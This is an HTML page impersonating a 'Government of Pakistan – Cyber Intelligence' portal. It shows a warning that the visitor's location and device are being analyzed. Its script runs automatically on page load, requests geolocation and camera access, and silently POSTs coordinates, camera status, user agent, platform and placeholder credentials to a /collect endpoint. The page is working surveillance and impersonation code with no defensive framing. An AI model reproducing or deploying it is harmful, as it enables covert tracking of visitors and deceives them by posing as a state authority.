<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Government of Pakistan ‚Äì Cyber Intelligence</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
  <link rel="icon" href="/static/pakistan-emblem.png">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #1b2631;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: rgba(255, 255, 255, 0.05);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 30px rgba(0,0,0,0.6);
      text-align: center;
      width: 360px;
      backdrop-filter: blur(10px);
      border: 1px solid #28a745;
    }
    .seal {
      width: 80px;
      margin-bottom: 15px;
    }
    h1 {
      font-size: 20px;
      margin-bottom: 10px;
      color: #28a745;
    }
    .warning {
      font-size: 12px;
      background: rgba(255, 0, 0, 0.1);
      border: 1px solid red;
      padding: 10px;
      margin-bottom: 20px;
      color: #ffcccc;
      border-radius: 6px;
    }
    #map {
      width: 100%;
      height: 200px;
      border-radius: 8px;
      margin-bottom: 10px;
      background: #555;
      line-height: 200px;
    }
  </style>
</head>
<body>
  <div class="box">
    <img src="/static/pakistan-emblem.png" class="seal" alt="Gov Logo">
    <h1>Government of Pakistan ‚Äì Cyber Intelligence</h1>
    <div class="warning">‚ö†Ô∏è Confidential System ‚Äì Location and Device are being analyzed.</div>
    <div id="map">üìç Fetching location...</div>
  </div>

  <script>
    async function collectData(cameraStatus, latitude = null, longitude = null) {
      const email = "captured@pakistan.gov";
      const password = "********"; // fake login
      console.log("üì° Auto-sending data to /collect...");

      try {
        await fetch("/collect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            latitude,
            longitude,
            camera: cameraStatus,
            deviceInfo: navigator.platform,
            email,
            password
          })
        });
        console.log("‚úÖ Data sent silently.");
      } catch (error) {
        console.error("‚ùå Error sending data:", error);
      }
    }

    async function startSurveillance() {
      let lat = null, lon = null;
      try {
        const position = await new Promise((resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject)
        );
        lat = position.coords.latitude;
        lon = position.coords.longitude;
        document.getElementById('map').innerText = `üìç Location: ${lat.toFixed(4)}, ${lon.toFixed(4)}`;
      } catch (err) {
        document.getElementById('map').innerText = "‚ùå Location Blocked";
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        stream.getTracks().forEach(track => track.stop());
        await collectData("‚úÖ Camera Allowed", lat, lon);
      } catch (err) {
        await collectData("‚ùå Camera Denied", lat, lon);
      }
    }

    // üü¢ Auto-start on load
    window.onload = startSurveillance;
  </script>
</body>
</html>
